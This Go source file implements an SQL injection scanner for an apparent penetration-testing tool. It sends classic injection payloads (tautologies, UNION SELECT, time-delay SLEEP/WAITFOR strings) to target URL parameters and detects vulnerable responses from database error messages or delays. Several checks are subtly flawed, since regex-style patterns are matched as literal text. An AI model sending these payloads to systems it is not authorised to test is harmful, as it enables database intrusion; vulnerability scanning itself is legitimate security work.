package scanners

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/cc1a2b/PenHunter/types"
)

type SQLiScanner struct {
	*BaseScanner
	payloads []string
}

func NewSQLiScanner(encoders []string) *SQLiScanner {
	payloads := []string{
		"'",
		"''",
		"' OR '1",
		"' OR 1 -- -",
		"' OR 1=1",
		"' OR 1=1--",
		"' OR 1=1#",
		"' OR '1'='1",
		"\" OR \"\"=\"",
		"\" OR 1=1--",
		"' AND 1=1",
		"' UNION SELECT NULL--",
		"' OR SLEEP(5)--",
		"' OR pg_sleep(5)--",
		"' OR WAITFOR DELAY '0:0:5'--",
	}

	return &SQLiScanner{
		BaseScanner: NewBaseScanner("SQLi", "critical", encoders),
		payloads:    payloads,
	}
}

func (s *SQLiScanner) Payloads() []string {
	return s.payloads
}

// DetectErrorBased checks for SQL error messages that indicate vulnerability
func (s *SQLiScanner) DetectErrorBased(resp *types.HttpResponse, baselineBody string) bool {
	body := strings.ToLower(string(resp.Body))
	baselineLower := strings.ToLower(baselineBody)

	// Specific SQL error patterns - these are strong indicators
	strongErrorPatterns := []string{
		"you have an error in your sql syntax",
		"mysql_fetch_array()",
		"mysql_fetch_assoc()",
		"mysql_num_rows()",
		"mysql_query()",
		"pg_query()",
		"pg_exec()",
		"ora-00936",  // missing expression
		"ora-00933",  // sql command not properly ended
		"ora-01756",  // quoted string not properly terminated
		"ora-00942",  // table or view does not exist
		"unclosed quotation mark after the character string",
		"quoted string not properly terminated",
		"sql syntax.*mysql",
		"warning.*mysql_",
		"warning.*pg_",
		"valid mysql result",
		"mysqlclient",
		"postgresql.*error",
		"unterminated quoted string",
		"sqlstate",
		"microsoft ole db provider for sql server",
		"jet database engine",
		"microsoft access driver",
		"sqlite_query",
		"sqlite3::query",
		"pdo::query",
		"odbc_exec",
	}

	for _, pattern := range strongErrorPatterns {
		// Check if error appears in response but NOT in baseline
		if strings.Contains(body, pattern) && !strings.Contains(baselineLower, pattern) {
			return true
		}
	}

	return false
}

func (s *SQLiScanner) Detect(resp *types.HttpResponse) bool {
	// Fallback for basic detection
	body := strings.ToLower(string(resp.Body))

	strongPatterns := []string{
		"you have an error in your sql syntax",
		"mysql_fetch",
		"ora-0",
		"postgresql.*error",
		"unclosed quotation mark",
	}

	for _, pattern := range strongPatterns {
		if strings.Contains(body, pattern) {
			return true
		}
	}

	return false
}

// DetectTimeBased checks for time-based SQL injection with stricter threshold
func (s *SQLiScanner) DetectTimeBased(resp *types.HttpResponse, baseline time.Duration, payload string) bool {
	// Only check time-based for sleep payloads
	if !strings.Contains(strings.ToLower(payload), "sleep") &&
		!strings.Contains(strings.ToLower(payload), "waitfor") &&
		!strings.Contains(strings.ToLower(payload), "pg_sleep") {
		return false
	}

	// Require at least 4 seconds delay for time-based (to reduce false positives)
	minDelay := 4 * time.Second
	if resp.Duration < minDelay {
		return false
	}

	// Must be significantly longer than baseline (at least 3x)
	if resp.Duration < baseline*3 {
		return false
	}

	return true
}

func (s *SQLiScanner) Scan(targetURL string, client types.HttpClient) []*types.Finding {
	var findings []*types.Finding
	seenVulns := make(map[string]bool)

	if !s.hasParameter(targetURL) {
		return findings
	}

	params := s.extractParameters(targetURL)
	if len(params) == 0 {
		return findings
	}

	// Get baseline response for comparison
	baselineResp, _ := client.Get(targetURL, nil)
	baselineTime := time.Millisecond * 500
	baselineBody := ""
	if baselineResp != nil {
		baselineTime = baselineResp.Duration
		baselineBody = string(baselineResp.Body)
	}

	for _, payload := range s.payloads {
		variants := s.mutatePayload(payload)

		for _, variant := range variants {
			for _, param := range params {
				parts := strings.SplitN(param, "=", 2)
				if len(parts) != 2 {
					continue
				}

				paramName := parts[0]

				// Skip if already found vuln for this param
				vulnKey := targetURL + "|" + paramName
				if seenVulns[vulnKey] {
					continue
				}

				injectedURL := s.injectPayload(targetURL, variant)

				resp, err := client.Get(injectedURL, nil)
				if err != nil {
					continue
				}

				// Error-based detection with baseline comparison
				if s.DetectErrorBased(resp, baselineBody) {
					evidence := s.extractEvidence(string(resp.Body), variant)
					confidence := 0.95

					finding := s.createFinding(
						injectedURL,
						paramName,
						variant,
						evidence,
						confidence,
						resp.StatusCode,
						string(resp.Body),
					)

					findings = append(findings, finding)
					seenVulns[vulnKey] = true
					continue
				}

				// Time-based detection with strict thresholds
				if s.DetectTimeBased(resp, baselineTime, variant) {
					evidence := fmt.Sprintf("Time-based SQLi: Response took %v (baseline: %v)", resp.Duration, baselineTime)
					confidence := 0.85

					finding := s.createFinding(
						injectedURL,
						paramName,
						variant,
						evidence,
						confidence,
						resp.StatusCode,
						"",
					)

					findings = append(findings, finding)
					seenVulns[vulnKey] = true
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
	}

	return findings
}

func (s *SQLiScanner) extractEvidence(body, payload string) string {
	errorPattern := regexp.MustCompile(`(?i)(you have an error in your sql syntax|warning: mysql|mysql_fetch|postgresql query failed|ora-\d{5}|quoted string not properly terminated|unclosed quotation mark|syntax error)[^<]*`)
	matches := errorPattern.FindString(body)
	if matches != "" {
		return matches
	}
	return "SQL error pattern detected in response"
}
